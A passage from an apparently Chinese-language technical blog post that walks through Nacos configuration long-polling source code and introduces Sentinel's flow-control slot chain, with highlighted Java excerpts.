*</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> cacheDatas              CacheDatas for config infomations.</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> inInitializingCacheList initial cache lists.</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> String include dataId and group (ps: it maybe null).</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@throws</span> Exception Exception.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">List&lt;String&gt; <span class=\"title function_\">checkUpdateDataIds</span><span class=\"params\">(List&lt;CacheData&gt; cacheDatas, List&lt;String&gt; inInitializingCacheList)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 拼接出配置文件的唯一标识</span></span><br><span class=\"line\">    <span class=\"type\">StringBuilder</span> <span class=\"variable\">sb</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (CacheData cacheData : cacheDatas) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!cacheData.isUseLocalConfigInfo()) &#123;</span><br><span class=\"line\">            sb.append(cacheData.dataId).append(WORD_SEPARATOR);</span><br><span class=\"line\">            sb.append(cacheData.group).append(WORD_SEPARATOR);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (StringUtils.isBlank(cacheData.tenant)) &#123;</span><br><span class=\"line\">                sb.append(cacheData.getMd5()).append(LINE_SEPARATOR);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                sb.append(cacheData.getMd5()).append(WORD_SEPARATOR);</span><br><span class=\"line\">                sb.append(cacheData.getTenant()).append(LINE_SEPARATOR);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cacheData.isInitializing()) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// It updates when cacheData occours in cacheMap by first time.</span></span><br><span class=\"line\">                inInitializingCacheList</span><br><span class=\"line\">                        .add(GroupKey.getKeyTenant(cacheData.dataId, cacheData.group, cacheData.tenant));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">isInitializingCacheList</span> <span class=\"operator\">=</span> !inInitializingCacheList.isEmpty();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> checkUpdateConfigStr(sb.toString(), isInitializingCacheList);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Fetch the updated dataId list from server.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> probeUpdateString       updated attribute string value.</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> isInitializingCacheList initial cache lists.</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> The updated dataId list(ps: it maybe null).</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@throws</span> IOException Exception.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">List&lt;String&gt; <span class=\"title function_\">checkUpdateConfigStr</span><span class=\"params\">(String probeUpdateString, <span class=\"type\">boolean</span> isInitializingCacheList)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    Map&lt;String, String&gt; params = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;String, String&gt;(<span class=\"number\">2</span>);</span><br><span class=\"line\">    params.put(Constants.PROBE_MODIFY_REQUEST, probeUpdateString);</span><br><span class=\"line\">    Map&lt;String, String&gt; headers = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;String, String&gt;(<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 长轮询的超时时间</span></span><br><span class=\"line\">    headers.put(<span class=\"string\">&quot;Long-Pulling-Timeout&quot;</span>, <span class=\"string\">&quot;&quot;</span> + timeout);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// told server do not hang me up if new initializing cacheData added in</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isInitializingCacheList) &#123;</span><br><span class=\"line\">        headers.put(<span class=\"string\">&quot;Long-Pulling-Timeout-No-Hangup&quot;</span>, <span class=\"string\">&quot;true&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (StringUtils.isBlank(probeUpdateString)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Collections.emptyList();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// In order to prevent the server from handling the delay of the client&#x27;s long task,</span></span><br><span class=\"line\">        <span class=\"comment\">// increase the client&#x27;s read timeout to avoid this problem.</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">readTimeoutMs</span> <span class=\"operator\">=</span> timeout + (<span class=\"type\">long</span>) Math.round(timeout &gt;&gt; <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 向服务端发起一个http请求，该请求在服务端配置没有变更的情况下默认会hang住30s</span></span><br><span class=\"line\">        HttpRestResult&lt;String&gt; result = agent</span><br><span class=\"line\">                .httpPost(Constants.CONFIG_CONTROLLER_PATH + <span class=\"string\">&quot;/listener&quot;</span>, headers, params, agent.getEncode(),</span><br><span class=\"line\">                        readTimeoutMs);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (result.ok()) &#123;</span><br><span class=\"line\">            setHealthServer(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"comment\">// 响应状态是成功则解析响应体得到 dataId、group、tenant 等信息并返回</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> parseUpdateDataIdResponse(result.getData());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            setHealthServer(<span class=\"literal\">false</span>);</span><br><span class=\"line\">            LOGGER.error(<span class=\"string\">&quot;[&#123;&#125;] [check-update] get changed dataId error, code: &#123;&#125;&quot;</span>, agent.getName(),</span><br><span class=\"line\">                    result.getCode());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">        setHealthServer(<span class=\"literal\">false</span>);</span><br><span class=\"line\">        LOGGER.error(<span class=\"string\">&quot;[&quot;</span> + agent.getName() + <span class=\"string\">&quot;] [check-update] get changed dataId exception&quot;</span>, e);</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> e;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Collections.emptyList();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>客户端对 listener 接口的请求会进入到服务端的 com.alibaba.nacos.config.server.controller.ConfigController#listener 方法进行处理，该方法主要是调用了 com.alibaba.nacos.config.server.controller.ConfigServletInner#doPollingConfig 方法。代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 轮询接口</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">doPollingConfig</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response,</span></span><br><span class=\"line\"><span class=\"params\">                              Map&lt;String, String&gt; clientMd5Map, <span class=\"type\">int</span> probeRequestSize)</span></span><br><span class=\"line\">    <span class=\"keyword\">throws</span> IOException, ServletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 如果支持长轮询则进入长轮询的流程</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (LongPollingService.isSupportLongPolling(request)) &#123;</span><br><span class=\"line\">        longPollingService.addLongPollingClient(request, response, clientMd5Map, probeRequestSize);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> HttpServletResponse.SC_OK + <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// else 兼容短轮询逻辑</span></span><br><span class=\"line\">    List&lt;String&gt; changedGroups = MD5Util.compareMd5(request, response, clientMd5Map);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 兼容短轮询result</span></span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">oldResult</span> <span class=\"operator\">=</span> MD5Util.compareMd5OldResult(changedGroups);</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">newResult</span> <span class=\"operator\">=</span> MD5Util.compareMd5ResultString(changedGroups);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">version</span> <span class=\"operator\">=</span> request.getHeader(Constants.CLIENT_VERSION_HEADER);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (version == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        version = <span class=\"string\">&quot;2.0.0&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">versionNum</span> <span class=\"operator\">=</span> Protocol.getVersionNumber(version);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 2.0.4版本以前, 返回值放入header中</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (versionNum &lt; START_LONGPOLLING_VERSION_NUM) &#123;</span><br><span class=\"line\">        response.addHeader(Constants.PROBE_MODIFY_RESPONSE, oldResult);</span><br><span class=\"line\">        response.addHeader(Constants.PROBE_MODIFY_RESPONSE_NEW, newResult);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        request.setAttribute(<span class=\"string\">&quot;content&quot;</span>, newResult);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 禁用缓存</span></span><br><span class=\"line\">    response.setHeader(<span class=\"string\">&quot;Pragma&quot;</span>, <span class=\"string\">&quot;no-cache&quot;</span>);</span><br><span class=\"line\">    response.setDateHeader(<span class=\"string\">&quot;Expires&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    response.setHeader(<span class=\"string\">&quot;Cache-Control&quot;</span>, <span class=\"string\">&quot;no-cache,no-store&quot;</span>);</span><br><span class=\"line\">    response.setStatus(HttpServletResponse.SC_OK);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> HttpServletResponse.SC_OK + <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们主要关注上面的 com.alibaba.nacos.config.server.service.LongPollingService#addLongPollingClient 长轮询流程的方法。代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">addLongPollingClient</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse rsp, Map&lt;String, String&gt; clientMd5Map,</span></span><br><span class=\"line\"><span class=\"params\">                                 <span class=\"type\">int</span> probeRequestSize)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">str</span> <span class=\"operator\">=</span> req.getHeader(LongPollingService.LONG_POLLING_HEADER);</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">noHangUpFlag</span> <span class=\"operator\">=</span> req.getHeader(LongPollingService.LONG_POLLING_NO_HANG_UP_HEADER);</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">appName</span> <span class=\"operator\">=</span> req.getHeader(RequestUtil.CLIENT_APPNAME_HEADER);</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">tag</span> <span class=\"operator\">=</span> req.getHeader(<span class=\"string\">&quot;Vipserver-Tag&quot;</span>);</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">delayTime</span> <span class=\"operator\">=</span> SwitchService.getSwitchInteger(SwitchService.FIXED_DELAY_TIME, <span class=\"number\">500</span>);</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 提前500ms返回响应，为避免客户端超时 <span class=\"doctag\">@qiaoyi</span>.dingqy 2013.10.22改动  add delay time for LoadBalance</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">timeout</span> <span class=\"operator\">=</span> Math.max(<span class=\"number\">10000</span>, Long.parseLong(str) - delayTime);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isFixedPolling()) &#123;</span><br><span class=\"line\">        timeout = Math.max(<span class=\"number\">10000</span>, getFixedPollingInterval());</span><br><span class=\"line\">        <span class=\"comment\">// do nothing but set fix polling timeout</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">start</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">        List&lt;String&gt; changedGroups = MD5Util.compareMd5(req, rsp, clientMd5Map);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (changedGroups.size() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            generateResponse(req, rsp, changedGroups);</span><br><span class=\"line\">            LogUtil.clientLog.info(<span class=\"string\">&quot;&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;&quot;</span>,</span><br><span class=\"line\">                System.currentTimeMillis() - start, <span class=\"string\">&quot;instant&quot;</span>, RequestUtil.getRemoteIp(req), <span class=\"string\">&quot;polling&quot;</span>,</span><br><span class=\"line\">                clientMd5Map.size(), probeRequestSize, changedGroups.size());</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (noHangUpFlag != <span class=\"literal\">null</span> &amp;&amp; noHangUpFlag.equalsIgnoreCase(TRUE_STR)) &#123;</span><br><span class=\"line\">            LogUtil.clientLog.info(<span class=\"string\">&quot;&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;&quot;</span>, System.currentTimeMillis() - start, <span class=\"string\">&quot;nohangup&quot;</span>,</span><br><span class=\"line\">                RequestUtil.getRemoteIp(req), <span class=\"string\">&quot;polling&quot;</span>, clientMd5Map.size(), probeRequestSize,</span><br><span class=\"line\">                changedGroups.size());</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">ip</span> <span class=\"operator\">=</span> RequestUtil.getRemoteIp(req);</span><br><span class=\"line\">    <span class=\"comment\">// 一定要由HTTP线程调用，否则离开后容器会立即发送响应</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">AsyncContext</span> <span class=\"variable\">asyncContext</span> <span class=\"operator\">=</span> req.startAsync();</span><br><span class=\"line\">    <span class=\"comment\">// AsyncContext.setTimeout()的超时时间不准，所以只能自己控制</span></span><br><span class=\"line\">    asyncContext.setTimeout(<span class=\"number\">0L</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">// 在 ClientLongPolling 的 run 方法会将 ClientLongPolling 实例（携带了本次请求的相关信息）放入 allSubs 中，然后会在29.5s后再执行另一个 Runnable，该 Runnable 用于等待29.5s后依旧没有相应的配置变更时对客户端进行响应，并将相应的 ClientLongPolling 实例从 allSubs 中移出</span></span><br><span class=\"line\">    scheduler.execute(</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">ClientLongPolling</span>(asyncContext, clientMd5Map, ip, probeRequestSize, timeout, appName, tag));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而 LongPollingService 实现了 AbstractEventListener，也就是说能接收事件通知，在其 com.alibaba.nacos.config.server.service.LongPollingService#onEvent 方法中可以看到，它关注的是 LocalDataChangeEvent 事件：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onEvent</span><span class=\"params\">(Event event)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isFixedPolling()) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ignore</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (event <span class=\"keyword\">instanceof</span> LocalDataChangeEvent) &#123;</span><br><span class=\"line\">            <span class=\"type\">LocalDataChangeEvent</span> <span class=\"variable\">evt</span> <span class=\"operator\">=</span> (LocalDataChangeEvent)event;</span><br><span class=\"line\">            scheduler.execute(<span class=\"keyword\">new</span> <span class=\"title class_\">DataChangeTask</span>(evt.groupKey, evt.isBeta, evt.betaIps));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在nacos上修改配置后就会产生 LocalDataChangeEvent 事件，此时 LongPollingService 也就能监听到，当收到该事件时就会遍历 allSubs，找到匹配的请求并将 groupKey 返回给客户端。具体代码在 DataChangeTask 中：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DataChangeTask</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            ConfigService.getContentBetaMd5(groupKey);</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Iterator&lt;ClientLongPolling&gt; iter = allSubs.iterator(); iter.hasNext(); ) &#123;</span><br><span class=\"line\">                <span class=\"type\">ClientLongPolling</span> <span class=\"variable\">clientSub</span> <span class=\"operator\">=</span> iter.next();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (clientSub.clientMd5Map.containsKey(groupKey)) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 如果beta发布且不在beta列表直接跳过</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (isBeta &amp;&amp; !betaIps.contains(clientSub.ip)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">// 如果tag发布且不在tag列表直接跳过</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (StringUtils.isNotBlank(tag) &amp;&amp; !tag.equals(clientSub.tag)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    getRetainIps().put(clientSub.ip, System.currentTimeMillis());</span><br><span class=\"line\">                    iter.remove(); <span class=\"comment\">// 删除订阅关系</span></span><br><span class=\"line\">                    LogUtil.clientLog.info(<span class=\"string\">&quot;&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;&quot;</span>,</span><br><span class=\"line\">                        (System.currentTimeMillis() - changeTime),</span><br><span class=\"line\">                        <span class=\"string\">&quot;in-advance&quot;</span>,</span><br><span class=\"line\">                        RequestUtil.getRemoteIp((HttpServletRequest)clientSub.asyncContext.getRequest()),</span><br><span class=\"line\">                        <span class=\"string\">&quot;polling&quot;</span>,</span><br><span class=\"line\">                        clientSub.clientMd5Map.size(), clientSub.probeRequestSize, groupKey);</span><br><span class=\"line\">                    clientSub.sendResponse(Arrays.asList(groupKey));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable t) &#123;</span><br><span class=\"line\">            LogUtil.defaultLog.error(<span class=\"string\">&quot;data change error:&quot;</span> + t.getMessage(), t.getCause());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    DataChangeTask(String groupKey) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>(groupKey, <span class=\"literal\">false</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    DataChangeTask(String groupKey, <span class=\"type\">boolean</span> isBeta, List&lt;String&gt; betaIps) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>(groupKey, isBeta, betaIps, <span class=\"literal\">null</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    DataChangeTask(String groupKey, <span class=\"type\">boolean</span> isBeta, List&lt;String&gt; betaIps, String tag) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.groupKey = groupKey;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.isBeta = isBeta;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.betaIps = betaIps;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.tag = tag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">final</span> String groupKey;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">changeTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> isBeta;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> List&lt;String&gt; betaIps;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> String tag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当客户端收到变更的dataid+group后，就会去服务端获取最新的配置数据，并更新本地数据 cacheData，然后发送数据变更事件，整个流程结束。</p>\n<ul>\n<li>获取服务端最新配置数据的方法：com.alibaba.nacos.client.config.impl.ClientWorker#getServerConfig</li>\n<li>发送数据变更事件的方法：com.alibaba.nacos.client.config.impl.CacheData#checkListenerMd5</li>\n</ul>\n<h2 id=\"Sentienl\"><a href=\"#Sentienl\" class=\"headerlink\" title=\"Sentienl\"></a>Sentienl</h2><p>Sentinel是阿里巴巴开源的一款流量控制和熔断降级框架，主要用于微服务架构中服务的流量控制和熔断降级。其限流实现原理主要分为两个部分：</p>\n<blockquote>\n<p>统计信息收集</p>\n</blockquote>\n<p>Sentinel会在运行过程中对服务的各种统计信息进行收集，包括请求的响应时间、请求通过的QPS（每秒查询率）、线程池队列大小等指标。这些指标通过定义的规则进行分析，判断当前请求是否超过了设定的阈值。</p>\n<blockquote>\n<p>阈值判断</p>\n</blockquote>\n<p>Sentinel根据收集到的统计信息，通过定义的规则对请求进行判断。规则中包括以下几个要素：</p>\n<p>资源名：对哪个资源进行限流<br>流控模式：直接拒绝或者匀速通过<br>流控阈值：单位时间内允许通过的请求个数<br>统计时间窗口：多长时间内统计一次流量，单位秒<br>降级处理：当请求超过阈值时的处理策略，如直接拒绝、返回默认值等<br>Sentinel会根据以上规则进行限流，当请求超过阈值时，根据设置的降级处理策略进行处理，比如直接拒绝请求、返回默认值等。同时，Sentinel还可以进行自适应的流控，根据实际情况调整阈值，保证服务的可用性和稳定性。</p>\n<h3 id=\"工作原理\"><a href=\"#工作原理\" class=\"headerlink\" title=\"工作原理\"></a>工作原理</h3><h4 id=\"Slot-插槽\"><a href=\"#Slot-插槽\" class=\"headerlink\" title=\"Slot 插槽\"></a>Slot 插槽</h4><p>在 Sentinel 里面，所有的资源都对应一个资源名称（resourceName），每次资源调用都会创建一个 Entry 对象。Entry 可以通过对主流框架的适配自动创建，也可以通过注解的方式或调用 SphU API 显式创建。Entry 创建的时候，同时也会创建一系列功能插槽（slot chain），这些插槽有不同的职责，例如:</p>\n<ul>\n<li>NodeSelectorSlot 负责收集资源的路径，并将这些资源的调用路径，以树状结构存储起来，用于根据调用路径来限流降级；</li>\n<li>ClusterBuilderSlot 则用于存储资源的统计信息以及调用者信息，例如该资源的 RT, QPS, thread count 等等，这些信息将用作为多维度限流，降级的依据；</li>\n<li>StatisticSlot 则用于记录、统计不同纬度的 runtime 指标监控信息；</li>\n<li>FlowSlot 则用于根据预设的限流规则以及前面 slot 统计的状态，来进行流量控制；</li>\n<li>AuthoritySlot 则根据配置的黑白名单和调用来源信息，来做黑白名单控制；</li>\n<li>DegradeSlot 则通过统计信息以及预设的规则，来做熔断降级；</li>\n<li>SystemSlot 则通过系统的状态，例如 load1 等，来控制总的入口流量；</li>\n</ul>\n<p>Sentinel 提供了插槽接口 ProcessorSlot，其中提供了方法 enrty 处理进入请求 和 exit 处理请求结束操作</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">ProcessorSlot</span>&lt;T&gt; &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Entrance of this slot.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> context         current &#123;<span class=\"doctag\">@link</span> Context&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> resourceWrapper current resource</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> param           generics parameter, usually is a &#123;<span class=\"doctag\">@link</span> com.alibaba.csp.sentinel.node.Node&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> count           tokens needed</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> prioritized     whether the entry is prioritized</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> args            parameters of the original call</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@throws</span> Throwable blocked exception or unexpected error</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">entry</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, T param, <span class=\"type\">int</span> count, <span class=\"type\">boolean</span> prioritized,</span></span><br><span class=\"line\"><span class=\"params\">               Object... args)</span> <span class=\"keyword\">throws</span> Throwable;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Means finish of &#123;<span class=\"doctag\">@link</span> #entry(Context, ResourceWrapper, Object, int, boolean, Object...)&#125;.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> context         current &#123;<span class=\"doctag\">@link</span> Context&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> resourceWrapper current resource</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> obj             relevant object (e.g. Node)</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> count           tokens needed</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> prioritized     whether the entry is prioritized</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> args            parameters of the original call</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@throws</span> Throwable blocked exception or unexpected error</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">fireEntry</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, Object obj, <span class=\"type\">int</span> count, <span class=\"type\">boolean</span> prioritized,</span></span><br><span class=\"line\"><span class=\"params\">                   Object... args)</span> <span class=\"keyword\">throws</span> Throwable;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Exit of this slot.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> context         current &#123;<span class=\"doctag\">@link</span> Context&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> resourceWrapper current resource</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> count           tokens needed</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> args            parameters of the original call</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">exit</span><span 